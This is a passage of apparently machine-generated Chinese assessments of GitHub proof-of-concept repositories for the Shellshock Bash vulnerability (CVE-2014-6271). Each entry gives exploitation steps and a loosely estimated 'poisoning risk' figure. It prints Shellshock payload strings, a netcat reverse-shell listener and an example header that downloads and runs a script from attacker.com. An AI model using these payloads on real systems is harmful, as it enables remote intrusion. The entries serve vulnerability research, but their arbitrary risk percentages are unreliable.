**影响版本:** <= 4.3

**利用条件:** 目标系统运行存在漏洞的Bash版本，并且存在CGI脚本或其他方式通过环境变量调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过特制的 Bash 环境变量执行任意命令。漏洞存在于 Bash 处理函数定义后尾随字符串的方式中。 

**有效性：**
提供的PoC代码是一个Python脚本，用于扫描目标URL是否存在Shellshock漏洞。它通过发送包含恶意payload的User-Agent头部的HTTP请求到常见的CGI脚本路径，然后检查响应中是否包含特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断目标是否易受攻击。根据漏洞库信息和搜索结果，该漏洞利用方式是有效的。

**投毒风险：**
该仓库包含一个Python脚本和一个README.md文件。Python脚本的功能是发送包含特定payload的HTTP请求并检查响应。README.md文件仅包含项目名称和描述。
 *  投毒代码分析: 该python脚本主要功能是发送特定Header的请求到服务器端CGI脚本,存在以下潜在的投毒风险：
    *  **CGI脚本路径猜测：**脚本中包含一个常见的CGI脚本路径列表。如果攻击者控制了该列表，可以通过添加恶意CGI路径来欺骗扫描者，引导他们攻击不存在的或伪造的服务。
    *  **Payload修改：**虽然当前的payload是良性的，用于检测漏洞，但攻击者可能修改payload以执行恶意操作，例如上传后门或执行拒绝服务攻击。
    *  **扫描行为：** 扫描行为本身可能被目标系统检测为恶意活动，从而触发防御机制或记录扫描者的IP地址。
    *  **误报风险：**脚本依赖于特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断漏洞是否存在。如果目标服务器返回包含该字符串的响应，即使实际不存在漏洞，脚本也会报告为易受攻击。修改这个字串可以导致信息泄露或者权限提升,因此可能存在一定风险。

**利用方式：**
1.  **环境变量注入：** 攻击者构造一个包含恶意代码的 Bash 函数定义的环境变量。例如：`(){ :;}; /usr/bin/id`。
2.  **触发 Bash 执行：** 通过 CGI 脚本、OpenSSH 的 ForceCommand 功能、DHCP 客户端脚本等方式，将构造的包含恶意代码的环境变量传递给 Bash。
3.  **代码执行：** 当 Bash 执行上述环境变量时，由于漏洞，尾随在函数定义后的命令会被执行，从而实现远程代码执行。

**总结：**
该PoC代码利用了Shellshock漏洞，通过环境变量注入执行任意命令。漏洞影响范围广泛，修复难度较大，危害程度高。


**项目地址:** [moften/CVE-2014-6271](https://github.com/moften/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #26

**来源**: [CVE-2014-6271-mritunjay-k_CVE-2014-6271.md](../2014/CVE-2014-6271-mritunjay-k_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名ShellShock，是GNU Bash中的一个严重漏洞。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被传递给Bash执行的进程时，会导致远程代码执行。 

**有效性：** 提供的POC代码是有效的。它通过设置`User-Agent`头来传递恶意payload。如果目标URL指向一个CGI脚本，且该脚本使用Bash处理环境变量，那么攻击者就可以执行任意命令。POC代码还包含一个检查机制，如果URL不包含`/cgi-bin/status`，它会提示用户是否要添加该路径，这增加了攻击的灵活性。

**投毒风险：** 在提供的`exploit.py`和`README.md`文件中，没有发现任何明显的投毒代码。代码逻辑清晰，目标是利用ShellShock漏洞执行命令。没有发现作者尝试引入恶意行为，例如上传恶意文件、植入后门或窃取凭据。因此，投毒风险评估为0%。

**利用方式：** 

1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统，该系统需要具有某种暴露点，该暴露点允许通过环境变量注入的方式利用Bash。常见的暴露点包括CGI脚本、OpenSSH的`ForceCommand`特性以及某些DHCP客户端。
2.  **构造Payload：** 构造一个包含恶意代码的环境变量。Payload的形式通常为`() { :; }; <command>`。其中`<command>`是要执行的shell命令。
3.  **传递Payload：** 将构造的Payload作为环境变量传递给Bash。对于CGI脚本，这可以通过设置HTTP头的`User-Agent`字段来实现，如提供的POC代码所示。在其他场景中，可能需要使用其他方法来设置环境变量。
4.  **执行命令：** 当Bash执行接收到包含Payload的CGI脚本时，它会解析环境变量，触发漏洞，并执行注入的命令。
5.  **验证执行结果:** POC脚本会打印出`page`的内容,命令执行的结果将会嵌入到返回的内容中.

**综上所述：** 提供的POC代码利用了ShellShock漏洞，通过构造恶意环境变量并在目标系统上触发执行，实现了远程命令执行。虽然漏洞利用风险很高，但提供的代码本身没有发现投毒风险。

**项目地址:** [mritunjay-k/CVE-2014-6271](https://github.com/mritunjay-k/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #27

**来源**: [CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md](../2014/CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且攻击者能够控制环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的严重漏洞。该漏洞源于Bash处理环境变量中函数定义之后存在的字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被Bash解析时，就能执行任意命令。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2014-6271是一个经过验证的漏洞，具有较高的利用成功率。

提供的Dockerfile和相关文件构成了一个可以利用该漏洞的环境。Dockerfile设置了一个基于Debian Wheezy的Apache服务器，并部署了一个CGI脚本（vulnerable），该脚本会调用Bash。攻击者可以通过设置恶意的环境变量，然后向CGI脚本发送HTTP请求来触发漏洞，从而在服务器上执行任意命令。

**投毒风险：**

分析提供的文件，存在一定的投毒风险，约为10%。Dockerfile中从/packages安装了预先存在的软件包。虽然COPY指令本身没有明显的恶意代码，但有需要审核的地方：
1. Dockerfile 从 `/packages` 目录安装软件包，而软件包的具体内容没有给出。如果这些包由攻击者控制，可能包含恶意后门。
2. `vulnerable` CGI 脚本的内容需要仔细审查，如果脚本本身存在后门，则存在投毒风险
3. main.sh 的内容也需要确认, 是否有安装一些额外的包.

**利用方式：**

1.  **CGI脚本利用：**  最常见的利用方式是通过CGI脚本。攻击者向Web服务器发送包含恶意环境变量的HTTP请求。如果Web服务器配置为使用Bash执行CGI脚本，Bash将解析这些环境变量，导致恶意代码执行。
2.  **OpenSSH ForceCommand：**  如果OpenSSH配置了ForceCommand选项，攻击者可以通过修改环境变量来执行任意命令。
3.  **DHCP客户端：**  某些DHCP客户端在执行脚本时会设置环境变量，攻击者可以通过控制DHCP服务器来注入恶意环境变量。

总之，CVE-2014-6271是一个高危漏洞，利用简单，影响广泛。需要及时修补受影响的系统。


**项目地址:** [opsxcq/exploit-CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #28

**来源**: [CVE-2014-6271-rsherstnev_CVE-2014-6271.md](../2014/CVE-2014-6271-rsherstnev_CVE-2014-6271.md)

## CVE-2014-6271 - ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程命令执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统运行Bash且存在可利用的入口点，例如CGI脚本、OpenSSH ForceCommand等。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的远程命令执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。漏洞利用的核心在于Bash在处理函数定义后附加的字符串时存在缺陷。 

**有效性评估：**
提供的Python POC代码利用了ShellShock漏洞，其有效性较高。代码首先通过发送包含特定字符串（`HelloKittyFromN0rdeN!`）的请求头来检测目标系统是否存在漏洞。如果检测到漏洞，则进入交互式shell，允许攻击者执行任意命令。

**利用方式分析：**
1.  **漏洞检测：** POC首先发送一个HTTP请求，其中User-Agent、Referer和Cookie头都包含恶意的Bash代码。这段代码的目的是在受影响的Bash版本中执行`echo HelloKittyFromN0rdeN!`命令，从而验证漏洞是否存在。
2.  **命令执行：** 如果漏洞存在，POC会进入一个循环，允许攻击者输入命令。输入的命令会被Base64编码，然后插入到HTTP请求头中。服务器端的Bash会解码并执行这些命令。
3.  **向量：** 此POC利用HTTP请求头（User-Agent, Referer, Cookie）作为攻击向量，这些头通常会被传递给服务器并可能被Bash处理。

**投毒风险分析：**
POC代码主要功能是检测和利用ShellShock漏洞。分析代码后，发现潜在的投毒风险较低（约1%）。

*   **Base64编码：** 使用Base64编码命令可能会被认为是一种混淆手段，但这是为了确保命令在HTTP头中传输的安全性，并非恶意隐藏代码。
*   **第三方库：** POC使用了requests库，理论上存在requests库被篡改的风险。但是，requests是常用的Python库，被篡改的可能性极低。
*   **BASE64_PATH变量:** 该变量用于指定`base64`命令的路径,如果该路径被修改为恶意程序,会存在投毒风险,但原代码中该变量默认为`/usr/bin/base64`,属于正常路径. 
*   **风险点：** 主要风险集中在使用未经授权的服务器上执行任意命令，这本身就是漏洞利用的目的，而不是POC代码引入的额外风险。

**搜索引擎结果印证：**
搜索结果确认了CVE-2014-6271是ShellShock漏洞，并且是广泛存在的，有多种利用方式。这些结果也强调了该漏洞的严重性和潜在影响。

综上所述，该POC代码的有效性较高，投毒风险较低，主要用于检测和利用ShellShock漏洞，允许攻击者通过HTTP请求头在目标系统上执行任意命令。

**项目地址:** [rsherstnev/CVE-2014-6271](https://github.com/rsherstnev/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---



---

## POC #12

**来源**: [CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md](../2014/CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过HTTP Header设置环境变量，且Bash版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式存在缺陷，攻击者可以通过构造包含恶意代码的环境变量，当Bash执行相关程序时，恶意代码会被执行，从而实现远程命令执行。从漏洞库信息和搜索引擎结果来看，此漏洞影响广泛，修复不彻底，危害巨大。

**有效性：**
提供的Python POC代码利用了ShellShock漏洞。它构造了一个包含恶意Bash代码的User-Agent头，并向目标URI发送GET请求。如果目标URI是一个CGI脚本，或者其他任何调用Bash并使用该User-Agent头作为环境变量的应用程序，那么恶意的Bash代码就会被执行，从而建立反向shell。

**投毒风险：**
该仓库的投毒风险较低。虽然任何代码都可能包含恶意成分，但此POC代码相对简单，主要功能是利用已知的ShellShock漏洞。潜在的风险可能包括：

*   作者可能在反向shell的Payload中植入其他恶意命令。但通过代码审计，反向shell的Payload清晰可见，未发现隐藏的恶意代码。
*   该代码可能针对特定系统环境做了优化，如果攻击者不了解这些优化，可能会导致利用失败，或留下攻击痕迹。但这种“优化”也可以被视作一种隐蔽的攻击尝试。

综合评估，该代码存在恶意投毒的可能性较低，约为5%。这个百分比代表一种潜在的风险，需要仔细审查代码才能完全消除。

**利用方式：**
1.  **确定目标：** 找到运行受影响Bash版本的服务器，并确认存在可以通过HTTP头设置环境变量的CGI脚本或其他应用。
2.  **准备攻击环境：** 在攻击者机器上设置NetCat监听指定端口，等待反向shell连接：`ncat -lkvnp <attacker-port>`。
3.  **构造Payload：** 使用POC脚本，指定目标IP地址、URI、攻击者IP地址和监听端口。
4.  **发送请求：** 运行POC脚本，它会构造一个包含恶意代码的HTTP GET请求，并将User-Agent设置为包含恶意代码的环境变量。
5.  **利用漏洞：** 如果目标存在漏洞，Bash会执行User-Agent头中的恶意代码，建立与攻击者机器的反向shell连接。
6.  **控制目标：** 攻击者通过反向shell控制目标系统，执行任意命令。

**项目地址:** [TheRealCiscoo/Shellshock-Exploit](https://github.com/TheRealCiscoo/Shellshock-Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #13

**来源**: [CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md](../2014/CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** 通过 4.3

**利用条件:** 目标系统使用Bash，且存在允许通过环境变量影响Bash执行的接口(例如CGI脚本)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的命令注入漏洞。该漏洞允许远程攻击者通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。利用方式通常涉及以下步骤：

1.  **确定目标系统是否易受攻击：** 检查目标系统是否正在运行易受攻击的Bash版本(通过 4.3).
2.  **寻找攻击入口点：** 寻找目标系统上允许通过环境变量影响Bash执行的接口，例如CGI脚本、OpenSSH的ForceCommand功能、DHCP客户端等。
3.  **构造恶意环境变量：** 构造包含恶意代码的函数定义的环境变量。例如：`() {{ :;}}; command`，其中`command`是要执行的命令。
4.  **发送包含恶意环境变量的请求：** 将构造的恶意环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
5.  **触发漏洞：** 目标系统在执行Bash时，会解析包含恶意代码的环境变量，从而执行攻击者指定的命令。

提供的POC代码`AutoShocker.py`是一个利用Shellshock漏洞的自动化脚本，具备以下功能：

*   **命令执行：** 允许攻击者在目标系统上执行任意命令，并将结果返回。
*   **反向Shell：** 允许攻击者在目标系统上建立反向Shell连接，从而获得对目标系统的完全控制权。

该漏洞利用的有效性取决于目标系统是否易受攻击，以及攻击者是否能够找到合适的攻击入口点。由于脚本需要用户输入目标IP和执行的命令/反向shell信息，因此投毒风险主要在于：

*   **误用风险：** 用户可能在未经授权的系统上使用该脚本，导致法律问题。
*   **脚本篡改：**  攻击者可能篡改脚本，添加恶意功能（例如植入后门、窃取用户凭据等），然后诱骗其他用户使用。

因此，我评估此仓库中存在作者隐藏的投毒代码的风险为10%。这主要是基于脚本本身的性质（漏洞利用工具）以及潜在的被篡改和滥用的可能性。

**项目地址:** [YunchoHang/CVE-2014-6271-SHELLSHOCK](https://github.com/YunchoHang/CVE-2014-6271-SHELLSHOCK)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #14

**来源**: [CVE-2014-6271-ajansha_shellshock.md](../2014/CVE-2014-6271-ajansha_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 通过 4.3

**利用条件:** 需要目标系统存在Bash环境并且存在可以设置环境变量的利用入口，例如：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以通过在环境变量中嵌入恶意代码，当Bash解析这些变量时，恶意代码会被执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2014-6271是一个真实存在且影响广泛的漏洞。提供的shelly.sh脚本是一个漏洞扫描器，用于检测目标系统是否存在Shellshock漏洞。由于它旨在 *检测* 而非 *利用* 漏洞，因此可以判断poc有效。

**投毒风险：**
分析提供的shelly.sh脚本，主要功能是检测目标系统是否存在Shellshock漏洞。脚本本身包含恶意代码的可能性较低，其主要通过发送包含特定payload的环境变量来触发漏洞，因此投毒的风险主要来自于脚本作者是否在检测Payload之外添加了额外的恶意逻辑。

尽管代码看起来比较直接，但仍然存在一定的低概率投毒风险，例如：
*   在漏洞检测逻辑之外，添加额外的命令执行代码，例如，扫描到存在漏洞后执行特定操作，上传信息等。
*   通过精心构造的payload，在检测漏洞的同时，悄悄地在目标系统上留下后门。

综合考虑代码量和功能，评估投毒风险为10%。

**利用方式：**
1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统。
2.  **寻找入口点：** 确定可以通过设置环境变量来与目标系统交互的入口点。常见的入口点包括：
    *   **HTTP CGI脚本：** 通过修改HTTP请求头中的User-Agent等字段，设置环境变量。
    *   **OpenSSH ForceCommand：**  通过SSH连接时设置环境变量。
    *   **DHCP客户端：** 某些DHCP客户端脚本在执行时会受到环境变量的影响。
3.  **构造Payload：** 构造包含恶意代码的环境变量。Payload的基本形式为`(){ :; }; command`，其中`command`是要执行的命令。
4.  **发送Payload：** 通过选择的入口点将构造的Payload发送给目标系统。
5.  **执行恶意代码：**  当目标系统中的Bash解析包含恶意代码的环境变量时，恶意代码将被执行，攻击者从而控制目标系统。

**项目地址:** [ajansha/shellshock](https://github.com/ajansha/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #15

**来源**: [CVE-2014-6271-akr3ch_CVE-2014-6271.md](../2014/CVE-2014-6271-akr3ch_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的恶意环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的 Bash 版本，且存在允许设置环境变量的途径，如 SSH ForceCommand, Apache mod_cgi/mod_cgid, DHCP 客户端等。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271 (Shellshock) 漏洞存在于 GNU Bash 中，攻击者可以通过在环境变量中嵌入恶意代码，利用 Bash 处理函数定义时存在的缺陷来执行任意命令。提供的 exploit.py 代码通过构造包含恶意命令的 User-Agent 头部，向目标 URL 发送 HTTP 请求，尝试利用 mod_cgi 或其他 CGI 脚本来触发漏洞。该漏洞影响广泛，可能导致服务器被完全控制。

**有效性：**
提供的 Python 脚本是有效的漏洞利用PoC，它通过构造恶意的 User-Agent 头部来触发 Shellshock 漏洞。

**投毒风险：**
该脚本的主要功能是利用 Shellshock 漏洞，没有发现任何明显的投毒代码，0%的可能性存在作者隐藏的投毒代码。

**利用方式：**
1.  确定目标系统运行着存在漏洞的 Bash 版本。
2.  找到一个可以设置环境变量的入口点（如 CGI 脚本）。
3.  使用提供的 Python 脚本或其他类似工具构造包含恶意代码的 HTTP 请求，并将该请求发送到目标 URL。
4.  如果漏洞存在且利用成功，恶意代码将在目标系统上执行。

**项目地址:** [akr3ch/CVE-2014-6271](https://github.com/akr3ch/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #16

**来源**: [CVE-2014-6271-anujbhan_shellshock-victim-host.md](../2014/CVE-2014-6271-anujbhan_shellshock-victim-host.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且通过CGI或其他方式允许环境变量注入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于 GNU Bash 中的严重漏洞。该漏洞允许攻击者通过特制的包含函数定义的字符串，在环境变量中注入并执行任意代码。

**有效性：**
提供的 Dockerfile 和相关 CGI 脚本构成了一个有效的 PoC 环境。Dockerfile 设置了一个基于 `vulhub/bash:4.3.0-with-httpd` 镜像的容器，该镜像包含一个易受攻击的 Bash 版本和一个 HTTP 服务器。`victim.cgi` 脚本旨在通过 CGI 执行 Bash 代码，但脚本本身的代码是无害的。漏洞利用的关键在于攻击者如何构造 HTTP 请求，将恶意代码注入到传递给 `victim.cgi` 脚本的环境变量中。如果服务器配置允许，则可以远程利用此漏洞执行任意命令。

**投毒风险：**
在提供的代码片段中，直接的代码投毒风险较低（约为 10%），主要原因是:
* `safe.cgi` 和 `victim.cgi` 文件中的 bash 代码非常简单，只输出“Hello world”，功能正常。没有发现任何恶意代码。  
*  Dockerfile指令中的 `RUN chmod +x /var/www/html/safe.cgi` 和 `RUN chmod +x /var/www/html/victim.cgi` 功能正常，没有发现任何恶意代码。

但是，需要注意以下几点潜在风险：
* **基础镜像风险：** PoC 依赖于 `vulhub/bash:4.3.0-with-httpd` 镜像。虽然该镜像旨在提供一个易受攻击的环境，但仍然需要确保该镜像本身没有被篡改或包含恶意代码。评估基础镜像的来源和可信度至关重要。
* **服务器配置风险：** 漏洞的利用依赖于 Web 服务器（如 Apache）如何处理 CGI 请求以及环境变量。如果服务器配置不当，可能会进一步加剧漏洞的风险。例如，某些配置可能允许攻击者覆盖更多的环境变量，从而扩大攻击面。
* **供应链攻击风险：** 攻击者可能通过污染开发者的环境或者代码仓库来插入恶意代码。

总体来说，直接代码投毒的风险较低，但基础镜像和服务器配置的安全性仍然需要谨慎评估。

**利用方式：**
1.  **目标环境：** 目标系统需要运行一个存在漏洞的 Bash 版本（<= 4.3）。
2.  **攻击入口：** 攻击通常通过 CGI 脚本或其他接受环境变量的 Web 应用入口进行。
3.  **注入恶意代码：** 攻击者构造一个包含恶意代码的环境变量。典型的 Shellshock payload 如下：`() { :; }; echo vulnerable`。这个 payload 利用了 Bash 在处理函数定义后剩余字符串的方式，`echo vulnerable` 会被执行。
4.  **触发漏洞：** 当 Bash 执行 CGI 脚本或处理包含恶意环境变量的请求时，漏洞被触发，攻击者注入的代码被执行。
5.  **远程代码执行：** 一旦漏洞被触发，攻击者就可以在目标系统上执行任意命令，例如获取敏感信息、修改系统配置或安装恶意软件。

**举例说明：**
攻击者可以构造一个 HTTP 请求头，例如 `User-Agent: () { :; }; /usr/bin/wget http://attacker.com/evil.sh -O /tmp/evil.sh; sh /tmp/evil.sh`。当 Web 服务器调用 Bash 处理该请求时，`wget` 命令会被执行，从 `attacker.com` 下载恶意脚本并在目标系统上执行。

**项目地址:** [anujbhan/shellshock-victim-host](https://github.com/anujbhan/shellshock-victim-host)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #17

**来源**: [CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md](../2014/CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md)

## CVE-2014-6271 - Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，且允许通过环境变量影响Bash执行，例如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。当Bash执行程序（例如，通过CGI脚本在Web服务器上）时，它会解析这些环境变量，从而导致代码注入。 

**有效性：**

根据提供的漏洞库信息、搜索结果和漏洞利用代码，该漏洞利用是有效的。漏洞库中明确指出该漏洞允许远程攻击者执行任意代码，搜索结果中也包含大量关于该漏洞的描述、利用案例和补丁信息。提供的Python POC代码也表明该漏洞可以被利用于获取目标系统的反向shell。

**投毒风险：**

分析提供的Python POC代码，风险较低。代码主要功能是构建带有恶意环境变量的HTTP请求，并发送到目标CGI脚本。代码中存在可以植入恶意代码的风险点在于payload的构建部分，但是目前的代码相对简单，仅用于执行反向shell。该仓库的 README 中有明确的测试目标和使用说明，相对比较安全。综上，认为此仓库存在10%的作者隐藏的投毒代码的可能性，该投毒代码可能为隐蔽的下载和执行其他恶意脚本。

**利用方式：**

1.  **确定目标：** 找到运行Bash且容易受到环境变量影响的应用程序或服务。常见的例子包括Web服务器上的CGI脚本。
2.  **构建Payload：** 构造一个包含恶意代码的环境变量。Payload通常包含一个函数定义，后跟要执行的命令。例如：`(){ :; }; echo vulnerable`
3.  **发送Payload：** 将构造的环境变量作为HTTP请求头或其他方式发送到目标应用程序。对于CGI脚本，可以通过User-Agent或其他HTTP头来传递。
4.  **执行代码：** 当目标应用程序调用Bash执行某些操作时，Bash会解析环境变量，从而执行注入的恶意代码。
5.  **反向Shell:** 本次提供的POC中,攻击者设置监听端口,通过漏洞利用,目标主机反弹shell给攻击者,达到控制目标主机的目的.

**风险缓解：**

*   升级Bash到已修复的版本。
*   限制对CGI脚本和其他易受攻击应用程序的访问。
*   验证和清理所有输入，特别是来自环境变量的输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [b4keSn4ke/CVE-2014-6271](https://github.com/b4keSn4ke/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #18

**来源**: [CVE-2014-6271-cved-sources_cve-2014-6271.md](../2014/CVE-2014-6271-cved-sources_cve-2014-6271.md)

## CVE-2014-6271-ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或使用OpenSSH的ForceCommand功能等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又称ShellShock，是一个存在于GNU Bash中的远程代码执行漏洞。漏洞源于Bash在处理环境变量中函数定义后的trailing strings的方式存在缺陷，允许攻击者通过构造恶意的环境变量来执行任意代码。

**1. 有效性：**

提供的Dockerfile构建了一个存在ShellShock漏洞的环境。`test.cgi`脚本被放置在`/usr/local/apache2/cgi-bin/`目录下，并且赋予了执行权限。该脚本会输出`/usr/bin/env`的内容，攻击者可以通过构造包含恶意代码的环境变量，并发送HTTP请求访问该CGI脚本，从而触发漏洞并执行恶意代码。因此提供的POC代码是有效的。

**2. 投毒风险：**

分析Dockerfile和相关文件：

*   Dockerfile：用于构建Docker镜像，升级Bash到4.3，并应用patch。
*   README.md：包含关于漏洞的信息以及镜像的来源。
*   `build/test.cgi`：一个简单的CGI脚本，用于触发漏洞。这个脚本本身不包含任何恶意代码,只是用于展示环境变量。

虽然大部分代码用于搭建漏洞测试环境，但仍存在潜在的投毒风险。Dockerfile中使用了`wget`从外部源下载bash源码和patch。尽管URL看起来是官方的GNU源，但如果这些源被劫持，则可能被替换为包含恶意代码的版本。此外，即使源代码没有被篡改，应用patch的过程也可能引入意料之外的问题。

综合来看，投毒风险较低，大约为10%。主要风险在于对外部源的依赖，以及patch应用过程中的潜在问题。

**3. 利用方式：**

ShellShock漏洞的利用方式如下：

1.  **攻击者构造包含恶意代码的环境变量。** 恶意代码被嵌入到函数定义之后，例如：`(){ :; }; command`。
2.  **攻击者通过某种方式将该环境变量传递给Bash。** 常见的场景包括：
    *   **CGI脚本：** 攻击者可以通过HTTP请求头设置环境变量，当Web服务器调用CGI脚本时，会将这些环境变量传递给Bash解释器。
    *   **OpenSSH的ForceCommand功能：** 攻击者可以通过SSH连接，利用ForceCommand功能执行命令，并将恶意环境变量传递给Bash。
    *   **DHCP客户端：** 在某些情况下，DHCP客户端会执行脚本，并将DHCP服务器提供的环境变量传递给Bash。
3.  **Bash执行包含恶意代码的环境变量。** 当Bash遇到函数定义后的trailing strings时，会将其作为命令执行，从而导致远程代码执行。

例如，通过CGI脚本利用该漏洞的Payload可能如下所示：

```
GET /cgi-bin/test.cgi HTTP/1.1
User-Agent: () { :; }; /usr/bin/env
Host: target.com
```

该请求会将`User-Agent`头设置为包含恶意代码的环境变量，当Web服务器调用`test.cgi`脚本时，`/usr/bin/env`命令会被执行。

**项目地址:** [cved-sources/cve-2014-6271](https://github.com/cved-sources/cve-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #19

**来源**: [CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md](../2014/CVE-2014-6271-cyberharsh_Shellbash-CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** through 4.3

**利用条件:** 目标系统使用CGI，OpenSSH等方式，且Bash版本在受影响范围内

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

